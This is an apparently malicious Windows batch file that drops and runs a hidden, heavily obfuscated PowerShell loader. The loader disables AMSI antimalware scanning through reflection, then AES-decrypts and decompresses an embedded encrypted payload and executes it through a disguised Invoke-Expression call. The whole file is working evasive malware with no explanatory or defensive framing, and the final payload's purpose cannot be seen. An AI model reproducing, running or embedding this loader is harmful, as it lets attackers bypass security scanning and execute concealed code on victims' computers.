@echo off
setlocal
set "PS=%TEMP%\svc.ps1"
del "%PS%" 2>nul

powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "$L=[IO.File]::ReadAllLines('%~f0');$A=[array]::IndexOf($L,'#PS1#')+1;$B=[array]::IndexOf($L,'#END#');[IO.File]::WriteAllLines($env:PS,$L[$A..($B-1)])"

if not exist "%PS%" exit /b

powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%PS%"
del "%PS%" 2>nul
endlocal
exit /b
#PS1#
$Lzf7GzaX4q22ILJz = ('Assemb' + 'ly')
$xMurmYFb31BYBOJZ0m = ('GetTy' + 'pe')
$u8RNrK7bCeupMCHo = ('GetFie' + 'ld')
$kEMqLmT5SDJYAk41B = ('SetVal' + 'ue')
$k7G4KpjLnKRxtSCDu = [sTRING]::('new')([coNVErT]::('FromB' + 'ase6' + '4Stri' + 'ng')('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA=='))
$ikXIlSjWzvzX8csfv2 = [sTRING]::('new')([coNVErT]::('FromB' + 'ase6' + '4Stri' + 'ng')('aW9uLkFtc2lVdGlscw=='))
$Oyua6PNvXAQJlLi6ei = [sTRING]::('new')([coNVErT]::('FromB' + 'ase6' + '4Stri' + 'ng')('YW1zaUluaXRGYWlsZWQ='))
$Kje9TA8wnLf6PP = [sTRING]::('new')([coNVErT]::('FromB' + 'ase6' + '4Stri' + 'ng')('Tm9uUHVibGljLFN0YXRpYw=='))
$An9UBfA36YB6rel = [reF].$Lzf7GzaX4q22ILJz
$otWKTxPMUjZ3FqQ3a = $An9UBfA36YB6rel.$xMurmYFb31BYBOJZ0m.('iNVOk' + [CHaR](69))(($k7G4KpjLnKRxtSCDu+$ikXIlSjWzvzX8csfv2))
$Xlct4WJTVpeuqoh = $otWKTxPMUjZ3FqQ3a.$u8RNrK7bCeupMCHo.('iNVOk' + [CHaR](69))($Oyua6PNvXAQJlLi6ei,$Kje9TA8wnLf6PP)
$Xlct4WJTVpeuqoh.$kEMqLmT5SDJYAk41B.('iNVOk' + [CHaR](69))((100-100),(200 -eq 200))
$FUfvQ25QDlYXVGQ5 = ('Mode')
$UmSx4wEdaDNQEGUUU = ('BlockS' + 'ize')
$J4d3aPpBeS74X9X9q = ('KeyS' + 'ize')
$Safbw0Liti4L4Qxq = ('Key')
$eTwuHKjEpm5dofxVCc = ('Iv')
$E8Zh4DJ4DOmbXv = ('Create' + 'Decr' + 'ypto' + [ChAR](114))
$rNHXOxOQa77NA5Wuoj = ('Transf' + 'ormFi' + 'nalBl' + 'ock')
$EJxZizoOFaPNXnQCyq = ('Leng' + 'th')
$Ry5Wg2Wi6QbndPKZ91 = ('CopyTo')
$CCUohkLW5A1fRQpVu = ('Clos' + [ChAr](101))
$mWcXx8ZvzXSkVw = ('Dispos' + [cHaR](101))
$kZTKUuDFXRRJPsm = ('ToAr' + 'ray')
$QrhhSmDOGoZXIr0w = ('GetS' + 'trin' + [chAr](103))
$P7cKRPbddbIzw5B = [Convert]::('FromBa' + 'se64' + 'Stri' + 'ng')('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')
$bGEv7loxGhBCsU = [Convert]::('FromBa' + 'se64' + 'Stri' + 'ng')('EvEAmWmzd0wN+HFQm8NiT42C4ZIUswIQDtyxRjRW3nE=')
$O8e76lGWJupObkCG = [sECuRItY.CrypTOGrapHY.aEs]::('Create')()
$O8e76lGWJupObkCG.$FUfvQ25QDlYXVGQ5 = [security.CrYptOgraPHy.CipHeRMoDe]::('Cbc')
$O8e76lGWJupObkCG.$UmSx4wEdaDNQEGUUU = [iNT]((7874 -band 7657)+(7874 -bor 7657)-15403)
$O8e76lGWJupObkCG.$J4d3aPpBeS74X9X9q = [Int]((7839 -band 5130)+(7839 -bor 5130)-12713)
$O8e76lGWJupObkCG.$Safbw0Liti4L4Qxq = $bGEv7loxGhBCsU
$O8e76lGWJupObkCG.$eTwuHKjEpm5dofxVCc = $P7cKRPbddbIzw5B[0..15]
$trZUYRTcsAN5q2prI = $O8e76lGWJupObkCG.$E8Zh4DJ4DOmbXv.('InVokE')()
$pj9Mg7WP7ljBE0jBKw = $trZUYRTcsAN5q2prI.$rNHXOxOQa77NA5Wuoj.('InVokE')($P7cKRPbddbIzw5B,16,($P7cKRPbddbIzw5B.$EJxZizoOFaPNXnQCyq - 16))
$dydxV9eE2n1jdZ = [io.MemoRYsTrEAm]::('new')([bYTE[]]$pj9Mg7WP7ljBE0jBKw)
$kbjlVIFVijcAaP0 = [io.MemoRYsTrEAm]::('new')()
$oEHNb5VWraqDuC9 = [IO.cOMprESsIOn.DEfLAteStrEam]::('new')($dydxV9eE2n1jdZ, [Io.coMPressIon.cOmPRESSionMOde]::('Decom' + 'pres' + [CHAr](115)))
$oEHNb5VWraqDuC9.$Ry5Wg2Wi6QbndPKZ91.('InVokE')($kbjlVIFVijcAaP0)
$oEHNb5VWraqDuC9.$CCUohkLW5A1fRQpVu.('InVokE')()
$O8e76lGWJupObkCG.$mWcXx8ZvzXSkVw.('InVokE')()
$dydxV9eE2n1jdZ.$CCUohkLW5A1fRQpVu.('InVokE')()
$ILjGX6QzryzFefoSj = $kbjlVIFVijcAaP0.$kZTKUuDFXRRJPsm.('InVokE')()
$NVqnBlXOuAOKqjGb4 = [TexT.ENCoDing]::('Utf8')
$qBxDrdXluCL6zz = $NVqnBlXOuAOKqjGb4.$QrhhSmDOGoZXIr0w.('InVokE')($ILjGX6QzryzFefoSj)
.([char]((2430-band3769)+(2430-bor3769)-6094)+[char]((1568-band1211)+(1568-bor1211)-2678)+[char]((6132-band7666)+(6132-bor7666)-13678))($qBxDrdXluCL6zz)
#END#